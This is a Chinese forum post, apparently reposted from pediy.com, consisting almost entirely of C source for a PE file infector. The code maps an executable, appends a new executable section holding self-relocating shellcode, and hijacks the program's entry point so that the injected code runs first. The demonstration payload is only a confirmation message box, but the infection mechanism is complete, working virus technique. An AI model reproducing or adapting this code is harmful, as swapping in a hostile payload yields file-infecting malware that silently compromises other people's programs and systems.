

# 感染 PE 文件 (原创, C 实现)

> 原文：[`www.pediy.com/kssd/pediy10/81233.html`](https://www.pediy.com/kssd/pediy10/81233.html)

#include <windows.h>  
#include <iostream>  
#include<tlhelp32.h>  
using namespace std;  
  
#pragma data\_seg(".mydat")   
#pragma code\_seg(".shell")  
#pragma const\_seg(".constdata")  
#pragma comment(linker,"/SECTION:.mydat,RWE")   
#pragma comment(linker,"/SECTION:.shell,RWE")  
#pragma comment(linker,"/SECTION:.constdata,RWE")  
#pragma comment(linker,"/MERGE:.mydat=.shell")  
#pragma comment(linker,"/MERGE:.constdata=.shell")  
#define Recode \_asm call A \_asm A: \_asm pop  ebx \_asm lea eax, A \_asm sub ebx,  eax  
#define GetFunOffset(pFun) \_asm mov  eax,  \[ebx + pFun\] \_asm mov  pFun,  eax  
#define GetStringOffset(pStr) \_asm mov eax, \[pStr\] \_asm lea  eax, \[ebx + eax\]  \_asm mov pStr, eax   
#define GetGlobalVar(dwGlobalVar, dwLocalVar) \_asm mov eax, \[ebx + dwGlobalVar\] \_asm mov dwLocalVar, eax  
#define GetGlobalAddr(dwGlobalVar, dwLocalVar) \_asm lea eax, \[ebx + dwGlobalVar\] \_asm mov dwLocalVar, eax  
#define VA\_END  -2  
  
DWORD GetProcessIdFromName(LPCTSTR name) ;  
void Fun2();  
int Invoke(char\*pDllName, char\*pFunName, ...);  
  
typedef HINSTANCE (WINAPI \*pLoadLibraryDef)(LPCTSTR);  
typedef DWORD (WINAPI \*pMsgBoxDef)(DWORD,DWORD,DWORD,DWORD);  
  
DWORD dwOldEntry = 0;  
char szUser32\[\] = "User32.Dll";  
char szMessageBox\[\] = "MessageBoxA";  
char szKernel32\[\] = "Kernel32.Dll";  
char szExitProcess\[\] = "ExitProcess";  
char szText\[\] = "真的要运行程序吗?";  
char szCaption\[\] = "CIW\_BLUE Code";  
  
  
void WINAPI Fun1()  
{  
  Recode;  
    
  DWORD dwOldAddr = 0;  
  char\* pUser32 = szUser32;  
  char\* pMessageBox = szMessageBox;  
  char\* pText = szText;  
  char\* pCaption = szCaption;  
  char\* pKernel32 = szKernel32;  
  char\* pExitProcess = szExitProcess;  
  
  GetStringOffset(pUser32);  
  GetStringOffset(pMessageBox);  
  GetStringOffset(pText);  
  GetStringOffset(pCaption);  
  GetStringOffset(pKernel32);  
  GetStringOffset(pExitProcess);  
  GetGlobalVar(dwOldEntry, dwOldAddr);  
  
  if( Invoke(pUser32, pMessageBox, NULL, pText, pCaption, MB\_YESNO, VA\_END) == IDNO)  
  {  
    Invoke(pKernel32, pExitProcess, 0, VA\_END);  
  }  
    
  \_asm  
  {   
    jmp dwOldAddr  
  }  
}  
  
int Invoke(char\* pDllName, char\* pFunName, ...)  
{   
  DWORD dwLoadLib = 0x7C801D77;  
  HMODULE hDll = ((HMODULE(WINAPI\*)(char\*))dwLoadLib)(pDllName);  
  PROC dwFunAddr = ((PROC(WINAPI\*)(HMODULE,char\*))0x7C80ADA0)(hDll, pFunName);  
  DWORD dwRet = 0;  
  DWORD dwParam\[128\], dwParamTemp = 0;  
  DWORD dwParamLen = 0;  
  va\_list stVaList;  
    
  va\_start(stVaList, pFunName);  
  while((dwParam\[dwParamLen++\] = va\_arg(stVaList,DWORD)) != VA\_END);  
  dwParamLen -= 2;  
  while(dwParamLen != -1)  
  {  
    dwParamTemp = dwParam\[dwParamLen--\];  
    \_asm push dwParamTemp  
  }  
  \_asm mov  eax, dwFunAddr  
    \_asm call eax  
    \_asm mov  dwRet,  eax  
    va\_end(stVaList);  
  return dwRet;  
}  
  
  
void End()   
{  
}  
  
int Align(int nSize, int n)  
{  
  if(nSize % n)  
  {  
    int num = nSize / n;  
    return (num + 1) \* n;  
  }  
  return nSize;  
}  
  
#define DOS IMAGE\_DOS\_HEADER  
#define NT IMAGE\_NT\_HEADERS  
#define SEC IMAGE\_SECTION\_HEADER  
  
int main()   
{  
  DWORD dwCodeSize = (DWORD)End - (DWORD)&dwOldEntry, dwSize = 0, dwOldEntry1 = 0;  
  HANDLE hFile = CreateFile("C:\\\\1.exe", GENERIC\_READ | FILE\_SHARE\_WRITE, FILE\_SHARE\_READ, NULL, OPEN\_EXISTING, NULL, NULL);  
  HANDLE hMapFile = CreateFileMapping(hFile, NULL, PAGE\_READWRITE, NULL, NULL, NULL);  
  PVOID pFile = MapViewOfFile(hMapFile, FILE\_MAP\_ALL\_ACCESS, NULL, NULL, NULL);  
    
  IMAGE\_NT\_HEADERS\* stNT = (NT\*)((char\*)pFile + ((DOS\*)pFile)->e\_lfanew);  
    
  IMAGE\_SECTION\_HEADER\* stSec = (SEC\*)((char\*)pFile + ((DOS\*)pFile)->e\_lfanew + sizeof(NT));  
  IMAGE\_SECTION\_HEADER\* stLastSec = &stSec\[stNT->FileHeader.NumberOfSections - 1\];  
  IMAGE\_SECTION\_HEADER\* stNewSec = &stSec\[stNT->FileHeader.NumberOfSections\];  
  DWORD dwFileAlign = stNT->OptionalHeader.FileAlignment;  
  DWORD dwCodeAlign = stNT->OptionalHeader.SectionAlignment;  
    
  stNT->FileHeader.NumberOfSections = stNT->FileHeader.NumberOfSections + 1;  
  
  strcpy((char\*)stNewSec->Name, ".CIW");  
  stNewSec->Characteristics = IMAGE\_SCN\_MEM\_EXECUTE | IMAGE\_SCN\_MEM\_READ | IMAGE\_SCN\_MEM\_WRITE | IMAGE\_SCN\_CNT\_CODE;  
  stNewSec->VirtualAddress = stLastSec->VirtualAddress + Align(stLastSec->Misc.VirtualSize, dwCodeAlign);  
  stNewSec->PointerToRawData = stLastSec->PointerToRawData + stLastSec->SizeOfRawData;  
  stNewSec->SizeOfRawData = Align(dwCodeSize, dwFileAlign);  
  stNewSec->Misc.VirtualSize = Align(dwCodeSize, dwCodeAlign);  
    
  stNT->OptionalHeader.SizeOfCode += stNewSec->Misc.VirtualSize;  
  stNT->OptionalHeader.SizeOfImage += stNewSec->Misc.VirtualSize;  
  
    
  SetFilePointer(hFile, stNewSec->PointerToRawData, NULL, FILE\_BEGIN);  
  WriteFile(hFile, &dwOldEntry, stNewSec->Misc.VirtualSize, &dwSize, NULL);  
  SetEndOfFile(hFile);  
  
  dwOldEntry1 = stNT->OptionalHeader.AddressOfEntryPoint + stNT->OptionalHeader.ImageBase;  
  SetFilePointer(hFile, stNewSec->PointerToRawData, NULL, FILE\_BEGIN);  
  WriteFile(hFile, &dwOldEntry1 , 4, &dwSize, NULL);  
  
  stNT->OptionalHeader.AddressOfEntryPoint = stNewSec->VirtualAddress + (DWORD)Fun1 - (DWORD)&dwOldEntry;  
  
  FlushViewOfFile(pFile, stNT->OptionalHeader.SizeOfHeaders);  
  
  UnmapViewOfFile(pFile);  
  CloseHandle(hMapFile);  
  CloseHandle(hFile);    
    
  return 0;  
}